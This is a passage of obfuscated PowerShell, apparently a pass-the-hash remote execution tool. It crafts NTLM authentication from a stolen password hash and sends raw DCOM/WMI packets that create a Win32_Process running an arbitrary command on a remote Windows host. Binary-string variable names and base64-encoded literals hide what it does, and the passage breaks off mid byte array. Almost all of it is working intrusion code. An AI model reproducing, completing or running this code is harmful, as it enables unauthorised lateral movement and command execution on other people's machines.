            ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA==')))] = 0x97,0x82,0x08,0xa2
            ${01010000110101010} = _00011111101010011 ${01110101000111010}
            ${10001000010101111} = ${01010000110101010}
            ${01010111111011001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
            ${01010111111011001}.Flush()    
            ${01010111111011001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
            ${10001010100110111} = ${00001011000101101}[20..23]
            ${00111011001001001} = [System.BitConverter]::ToString(${00001011000101101})
            ${00111011001001001} = ${00111011001001001} -replace "-",""
            ${10001011001110110} = ${00111011001001001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
            ${00001110001001001} = ${10001011001110110} / 2
            ${10010101000101110} = _01010101100011101 (${00001110001001001} + 12) ${00001011000101101}
            ${00000111010111010} = _01010101100011101 (${00001110001001001} + 40) ${00001011000101101}
            ${10111110010110011} = ${00001011000101101}[44..51]
            ${10010001001100110} = ${00001011000101101}[(${00001110001001001} + 24)..(${00001110001001001} + 31)]
            ${10100010100001010} = ${00001011000101101}[(${00001110001001001} + 56 + ${10010101000101110})..(${00001110001001001} + 55 + ${10010101000101110} + ${00000111010111010})]
            ${10011110011111011} = ${10100010100001010}[(${10100010100001010}.Length - 12)..(${10100010100001010}.Length - 5)]
            ${00011111100001011} = (&{for (${01110010110000101} = 0;${01110010110000101} -lt $hash.Length;${01110010110000101} += 2){$hash.SubString(${01110010110000101},2)}}) -join "-"
            ${00011111100001011} = ${00011111100001011}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${00010000010011000} = (ls -path env:computername).Value
            ${10101010000011000} = [System.Text.Encoding]::Unicode.GetBytes(${00010000010011000})
            ${00100110101101011} = $Domain
            ${00101100001010101} = [System.Text.Encoding]::Unicode.GetBytes(${00100110101101011})
            ${10010110010010011} = [System.Text.Encoding]::Unicode.GetBytes($username)
            ${01001101010000110} = [System.BitConverter]::GetBytes(${00101100001010101}.Length)[0,1]
            ${01001101010000110} = [System.BitConverter]::GetBytes(${00101100001010101}.Length)[0,1]
            ${00100001010100010} = [System.BitConverter]::GetBytes(${10010110010010011}.Length)[0,1]
            ${01110100010000010} = [System.BitConverter]::GetBytes(${10101010000011000}.Length)[0,1]
            ${01111010011110101} = 0x40,0x00,0x00,0x00
            ${00000011000111100} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + 64)
            ${00010010000100001} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + 64)
            ${01000100101011111} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + ${10101010000011000}.Length + 64)
            ${01001001111101100} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + ${10101010000011000}.Length + 88)
            ${01011100110010101} = New-Object System.Security.Cryptography.HMACMD5
            ${01011100110010101}.key = ${00011111100001011}
            ${10011110010011111} = $username.ToUpper()
            ${10011111011110110} = [System.Text.Encoding]::Unicode.GetBytes(${10011110010011111})
            ${10011111011110110} += ${00101100001010101}
            ${10101111110011000} = ${01011100110010101}.ComputeHash(${10011111011110110})
            ${00000000001101100} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${10110010111010110} = ${00000000001101100}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${01110111100100011} = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    ${10011110011111011} +
                                    ${10110010111010110} +
                                    0x00,0x00,0x00,0x00 +
                                    ${10100010100001010} +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00
            ${10011100101111001} = ${10010001001100110} + ${01110111100100011}
            ${01011100110010101}.key = ${10101111110011000}
            ${10010100001101010} = ${01011100110010101}.ComputeHash(${10011100101111001})
            ${01011000010000100} = ${01011100110010101}.ComputeHash(${10010100001101010})
            ${00011010010101010} = 0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,
                                        0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,0x74,0x6f,0x2d,0x73,0x65,0x72,0x76,
                                        0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,0x6e,0x67,0x20,0x6b,0x65,0x79,
                                        0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,0x6e,0x73,0x74,0x61,0x6e,
                                        0x74,0x00
            ${10110110001110011} = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            ${01100011000111001} = ${10110110001110011}.ComputeHash(${01011000010000100} + ${00011010010101010})
            ${10010100001101010} = ${10010100001101010} + ${01110111100100011}
            ${10101110111110000} = [System.BitConverter]::GetBytes(${10010100001101010}.Length)[0,1]
            ${00000110010000010} = [System.BitConverter]::GetBytes(${00101100001010101}.Length + ${10010110010010011}.Length + ${10101010000011000}.Length + ${10010100001101010}.Length + 88)
            ${00010010000110101} = 0x00,0x00
            ${00010110111010010} = 0x15,0x82,0x88,0xa2
            ${01111101001110011} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    ${01000100101011111} +
                                    ${10101110111110000} +
                                    ${10101110111110000} +
                                    ${01001001111101100} +
                                    ${01001101010000110} +
                                    ${01001101010000110} +
                                    ${01111010011110101} +
                                    ${00100001010100010} +
                                    ${00100001010100010} +
                                    ${00000011000111100} +
                                    ${01110100010000010} +
                                    ${01110100010000010} +
                                    ${00010010000100001} +
                                    ${00010010000110101} +
                                    ${00010010000110101} +
                                    ${00000110010000010} +
                                    ${00010110111010010} +
                                    ${00101100001010101} +
                                    ${10010110010010011} +
                                    ${10101010000011000} +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    ${10010100001101010}
            ${01011100110010101}.key = ${01100011000111001}
            [Byte[]]${00110110010011000} = 0x00,0x00,0x00,0x00
            ${01110101000111010} = _01111010001111011 ${01111101001110011}
            ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA')))] = 0x02,0x00,0x00,0x00
            ${01110101000111010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA')))] = 0x04
            ${01010000110101010} = _00011111101010011 ${01110101000111010}
            ${10001000010101111} = ${01010000110101010}
            ${01010111111011001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
            ${01010111111011001}.Flush()
            ${01110101000111010} = _00001110101011110 0x83 76 16 4 0x02,0x00,0x00,0x00 0x00,0x00 0x03,0x00 ${10111101000010001}
            ${00011100100010100} = _01001110110010100 ${00001101001111011} ${10110001101101001} 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
            ${10101010001110010} = _01000011010001100 4 0x04 ${00110110010011000}
            ${01010000110101010} = _00011111101010011 ${01110101000111010}
            ${10101011010110111} = _00011111101010011 ${00011100100010100}
            ${01110010001101010} = _00011111101010011 ${10101010001110010}
            ${01011100110010101}.key = ${01100011000111001}
            ${10001010001001010} = ${01011100110010101}.ComputeHash(${00110110010011000} + ${01010000110101010} + ${10101011010110111} + ${01110010001101010}[0..11])
            ${10001010001001010} = ${10001010001001010}[0..7]
            ${10101010001110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABWAGUAcgBpAGYAaQBlAHIAQwBoAGUAYwBrAHMAdQBtAA==')))] = ${10001010001001010}
            ${01110010001101010} = _00011111101010011 ${10101010001110010}
            ${10001000010101111} = ${01010000110101010} + ${10101011010110111} + ${01110010001101010}
            ${01010111111011001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
            ${01010111111011001}.Flush()    
            ${01010111111011001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
            ${10001010110110111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
            if(${00001011000101101}[2] -eq 3 -and [System.BitConverter]::ToString(${00001011000101101}[24..27]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
            {
                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAMQAwADAAMAAwADAAMAAxADAAMQAwADEAMAAwADEAMQAwAH0AIABXAE0ASQAgAGEAYwBjAGUAcwBzACAAZABlAG4AaQBlAGQAIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMAAxADAAMQAwADEAMQAxAH0A')))   
            }
            elseif(${00001011000101101}[2] -eq 3)
            {
                ${10011000101100111} = [System.BitConverter]::ToString(${00001011000101101}[27..24])
                ${10011000101100111} = ${10011000101100111} -replace "-",""
                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABGAGEAaQBsAGUAZAAgAHcAaQB0AGgAIABlAHIAcgBvAHIAIABjAG8AZABlACAAMAB4ACQAewAxADAAMAAxADEAMAAwADAAMQAwADEAMQAwADAAMQAxADEAfQA=')))
            }
            elseif(${00001011000101101}[2] -eq 2)
            {
                ${01100011110100000} = [System.BitConverter]::ToString(${00001011000101101})
                ${01100011110100000} = ${01100011110100000} -replace "-",""
                ${01010010001011111} = ${01100011110100000}.IndexOf(${01110110001000001})
                ${10000100011011100} = ${01010010001011111} / 2
                ${00111110110000010} = ${00001011000101101}[(${10000100011011100} + 16)..(${10000100011011100} + 31)]
                ${10001010110110111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHQAZQByAEMAbwBuAHQAZQB4AHQA')))
            }
            else
            {
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAG8AbQBlAHQAaABpAG4AZwAgAHcAZQBuAHQAIAB3AHIAbwBuAGcA')))
            }
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAYwBvAG0AbQBhAG4AZAAgAGUAeABlAGMAdQB0AGkAbwBuAA==')))
            ${10110100110101000} = 5500
            :WMI_execute_loop while (${10001010110110111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
            {
                if(${00001011000101101}[2] -eq 3)
                {
                    ${10011000101100111} = [System.BitConverter]::ToString(${00001011000101101}[27..24])
                    ${10011000101100111} = ${10011000101100111} -replace "-",""
                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABGAGEAaQBsAGUAZAAgAHcAaQB0AGgAIABlAHIAcgBvAHIAIABjAG8AZABlACAAMAB4ACQAewAxADAAMAAxADEAMAAwADAAMQAwADEAMQAwADAAMQAxADEAfQA=')))
                    ${10001010110110111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                }
                switch (${10001010110110111})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHQAZQByAEMAbwBuAHQAZQB4AHQA')))
                    {
                        switch (${00110110010011000}[0])
                        {
                            0
                            {
                                ${10000100111110111} = 0x03,0x00,0x00,0x00
                                ${00111001011111100} = 0x02,0x00
                                ${10011001001110001} = 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                            }
                            1
                            {
                                ${10000100111110111} = 0x04,0x00,0x00,0x00 
                                ${00111001011111100} = 0x03,0x00
                                ${10011001001110001} = 0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                            }
                            6
                            {
                                ${10000100111110111} = 0x09,0x00,0x00,0x00 
                                ${00111001011111100} = 0x04,0x00
                                ${10011001001110001} = 0x99,0xdc,0x56,0x95,0x8c,0x82,0xcf,0x11,0xa3,0x7e,0x00,0xaa,0x00,0x32,0x40,0xc7
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                            }
                        }
                        ${01110101000111010} = _01111011001110011 ${10001010100110111} ${10000100111110111} ${00111001011111100} ${10011001001110001}
                        ${01010000110101010} = _00011111101010011 ${01110101000111010}
                        ${10001000010101111} = ${01010000110101010}
                        ${01010111111011001}.Write(${10001000010101111},0,${10001000010101111}.Length) > $null
                        ${01010111111011001}.Flush()    
                        ${01010111111011001}.Read(${00001011000101101},0,${00001011000101101}.Length) > $null
                        ${10001010110110111} = ${01110101011101101}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${11000010011101000} = $false
                        switch (${00110110010011000}[0])
                        {
                            0
                            {
                                ${00110110010011000} = 0x01,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 12
                                ${01001010010100011} = 0x03,0x00,0x00,0x00
                                ${01000110111100000} = 0x02,0x00
                                ${10101001001100000} = 0x03,0x00
                                ${10101000111010010} = ${00111110110000010}
                                ${00110001011010111} = [System.BitConverter]::GetBytes(${00010000010011000}.Length + 1)
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHQAZQByAEMAbwBuAHQAZQB4AHQA')))
                                if([Bool](${00010000010011000}.Length % 2))
                                {
                                    ${10101010000011000} += 0x00,0x00
                                }
                                else
                                {
                                    ${10101010000011000} += 0x00,0x00,0x00,0x00
                                }
                                ${00000111101111001} = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                ${00001101001111011} + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 + 
                                                ${00110001011010111} +
                                                0x00,0x00,0x00,0x00 +
                                                ${00110001011010111} +
                                                ${10101010000011000} +
                                                ${10111010001011001} + 
                                                0x00,0x00,0x00,0x00,0x00,0x00
                            }
                            1
                            {
                                ${00110110010011000} = 0x02,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 8
                                ${01001010010100011} = 0x04,0x00,0x00,0x00
                                ${01000110111100000} = 0x03,0x00
                                ${10101001001100000} = 0x03,0x00
                                ${10101000111010010} = ${10110001101101001}
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                ${00000111101111001} = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                ${00001101001111011} + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                            }
                            2
                            {
                                ${00110110010011000} = 0x03,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 0
                                ${01001010010100011} = 0x05,0x00,0x00,0x00
                                ${01000110111100000} = 0x03,0x00
                                ${10101001001100000} = 0x06,0x00
                                ${10101000111010010} = ${10110001101101001}
                                [Byte[]]${00001010111011001} = [System.BitConverter]::GetBytes(${10101101000101000}.Length + 14)
                                [Byte[]]${01111000111111001} = [System.Text.Encoding]::Unicode.GetBytes($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAxADAAMQAwADEAMQAwADEAMAAwADAAMQAwADEAMAAwADAAfQBcAHIAbwBvAHQAXABjAGkAbQB2ADIA'))))
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                if([Bool](${10101101000101000}.Length % 2))
                                {
                                    ${01111000111111001} += 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    ${01111000111111001} += 0x00,0x00
                                }
                                ${00000111101111001} = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                ${00001101001111011} +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                ${00001010111011001} +
                                                0x00,0x00,0x00,0x00 +
                                                ${00001010111011001} +
                                                ${01111000111111001} +
                                                0x04,0x00,0x02,0x00,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x09,
                                                0x00,0x00,0x00,0x65,0x00,0x6e,0x00,0x2d,0x00,0x55,0x00,0x53,0x00,
                                                0x2c,0x00,0x65,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00
                            }
                            3
                            {
                                ${00110110010011000} = 0x04,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 8
                                ${01001010010100011} = 0x06,0x00,0x00,0x00
                                ${01000110111100000} = 0x00,0x00
                                ${10101001001100000} = 0x05,0x00
                                ${10101000111010010} = ${10111101000010001}
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                ${01100011110100000} = [System.BitConverter]::ToString(${00001011000101101})
                                ${01100011110100000} = ${01100011110100000} -replace "-",""
                                ${01010010001011111} = ${01100011110100000}.IndexOf(${01110110001000001})
                                ${10000100011011100} = ${01010010001011111} / 2
                                ${10100111111010100} = ${00001011000101101}[(${10000100011011100} + 16)..(${10000100011011100} + 31)]
                                ${01110001100110100} = _00100111101111110 ${00001101001111011} ${00111110110000010} ${10110001101101001}
                                ${00000111101111001} = _00011111101010011 ${01110001100110100}
                            }
                            4
                            {
                                ${00110110010011000} = 0x05,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 4
                                ${01001010010100011} = 0x07,0x00,0x00,0x00
                                ${01000110111100000} = 0x00,0x00
                                ${10101001001100000} = 0x03,0x00
                                ${10101000111010010} = ${10111101000010001}
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                ${00011100100010100} = _01001110110010100 ${00001101001111011} ${10100111111010100} 0x9e,0xc1,0xfc,0xc3,0x70,0xa9,0xd2,0x11,0x8b,0x5a,0x00,0xa0,0xc9,0xb7,0xc9,0xc4
                                ${00000111101111001} = _00011111101010011 ${00011100100010100}
                            }
                            5
                            {
                                ${00110110010011000} = 0x06,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 4
                                ${01001010010100011} = 0x08,0x00,0x00,0x00
                                ${01000110111100000} = 0x00,0x00
                                ${10101001001100000} = 0x03,0x00
                                ${10101000111010010} = ${10111101000010001}
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAHQAZQByAEMAbwBuAHQAZQB4AHQA')))
                                ${00011100100010100} = _01001110110010100 ${00001101001111011} ${10100111111010100} 0x83,0xb2,0x96,0xb1,0xb4,0xba,0x1a,0x10,0xb6,0x9c,0x00,0xaa,0x00,0x34,0x1d,0x07
                                ${00000111101111001} = _00011111101010011 ${00011100100010100}
                            }
                            6
                            {
                                ${00110110010011000} = 0x07,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 0
                                ${01001010010100011} = 0x09,0x00,0x00,0x00
                                ${01000110111100000} = 0x04,0x00
                                ${10101001001100000} = 0x06,0x00
                                ${10101000111010010} = ${10100111111010100}
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                ${00000111101111001} = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                ${00001101001111011} +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00
                            }
                            7
                            {
                                ${00110110010011000} = 0x08,0x00,0x00,0x00
                                ${10111001100010100} = 0x83
                                ${00100011010010100} = 0
                                ${01001010010100011} = 0x10,0x00,0x00,0x00
                                ${01000110111100000} = 0x04,0x00
                                ${10101001001100000} = 0x06,0x00
                                ${10101000111010010} = ${10100111111010100}
                                ${01110101011101101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdAA=')))
                                ${00000111101111001} = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                ${00001101001111011} +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00
                            }
                            {$_ -ge 8}
                            {
                                ${00110110010011000} = 0x09,0x00,0x00,0x00
                                ${00100011010010100} = 0
                                ${01001010010100011} = 0x0b,0x00,0x00,0x00
                                ${01000110111100000} = 0x04,0x00
                                ${10101001001100000} = 0x18,0x00
                                ${10101000111010010} = ${10100111111010100}
                                [Byte[]]${00010001001001010} = [System.BitConverter]::GetBytes($Command.Length + 1769)[0,1]
                                [Byte[]]${00110000000011010} = [System.BitConverter]::GetBytes($Command.Length + 1727)[0,1]
                                [Byte[]]${10110100110011011} = [System.BitConverter]::GetBytes($Command.Length + 1713)[0,1]
                                [Byte[]]${01001001010111010} = [System.BitConverter]::GetBytes($Command.Length + 93)[0,1]
                                [Byte[]]${10011010101010011} = [System.BitConverter]::GetBytes($Command.Length + 16)[0,1]
                                [Byte[]]${01001101101010111} = [System.Text.Encoding]::UTF8.GetBytes($Command)
                                [String]${00000001101101111} = $Command.Length / 4
                                if(${00000001101101111} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuADcANQA='))))
                                {
                                    ${01001101101010111} += 0x00
                                }
                                elseif(${00000001101101111} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuADUA'))))
                                {
                                    ${01001101101010111} += 0x00,0x00
                                }
                                elseif(${00000001101101111} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuADIANQA='))))
                                {
                                    ${01001101101010111} += 0x00,0x00,0x00
                                }
                                else
                                {
                                    ${01001101101010111} += 0x00,0x00,0x00,0x00
                                }
                                ${00000111101111001} = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                ${00001101001111011} +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x55,0x73,0x65,0x72,
                                                0x06,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x63,
                                                0x00,0x72,0x00,0x65,0x00,0x61,0x00,0x74,0x00,0x65,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                ${00010001001001010} +
                                                0x00,0x00 +
                                                ${00010001001001010} +
                                                0x00,0x00,0x4d,0x45,0x4f,0x57,0x04,0x00,0x00,0x00,0x81,0xa6,0x12,
                                                0xdc,0x7f,0x73,0xcf,0x11,0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24,
                                                0x12,0xf8,0x90,0x45,0x3a,0x1d,0xd0,0x11,0x89,0x1f,0x00,0xaa,0x00,
                                                0x4b,0x2e,0x24,0x00,0x00,0x00,0x00 +
                                                ${00110000000011010} +
                                                0x00,0x00,0x78,0x56,0x34,0x12 +
                                                ${10110100110011011} +
                                                0x00,0x00,0x02,0x53,
                                                0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x04,
                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0x03,0x00,0x00,0x00,0x2a,0x00,0x00,0x00,
                                                0x15,0x01,0x00,0x00,0x73,0x01,0x00,0x00,0x76,0x02,0x00,0x00,0xd4,
                                                0x02,0x00,0x00,0xb1,0x03,0x00,0x00,0x15,0xff,0xff,0xff,0xff,0xff,
                                                0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x12,0x04,0x00,0x80,0x00,0x5f,
                                                0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,0x52,0x53,0x00,0x00,
                                                0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,0x69,0x6e,0x65,
                                                0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,
                                                0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,
                                                0x00,0x00,0x49,0x6e,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x5e,0x00,0x00,
                                                0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0x94,
                                                0x00,0x00,0x00,0x00,0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,
                                                0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,
                                                0x68,0x72,0x65,0x61,0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,
                                                0x6e,0x73,0x7c,0x6c,0x70,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,
                                                0x69,0x6e,0x65,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,
                                                0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
                                                0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,
                                                0x5e,0x00,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0xca,0x00,
                                                0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x8c,0x00,0x00,0x00,0x00,0x49,
                                                0x44,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x0a,0x00,0x00,0x80,0x03,0x08,
                                                0x00,0x00,0x00,0x59,0x01,0x00,0x00,0x5e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0xca,0x00,0x00,0x00,0x02,0x08,0x20,0x00,
                                                0x00,0x8c,0x00,0x00,0x00,0x11,0x01,0x00,0x00,0x11,0x03,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,
                                                0x08,0x00,0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x04,0x00,0x00,0x00,0x00,0x43,0x75,0x72,0x72,0x65,0x6e,0x74,
                                                0x44,0x69,0x72,0x65,0x63,0x74,0x6f,0x72,0x79,0x00,0x00,0x73,0x74,
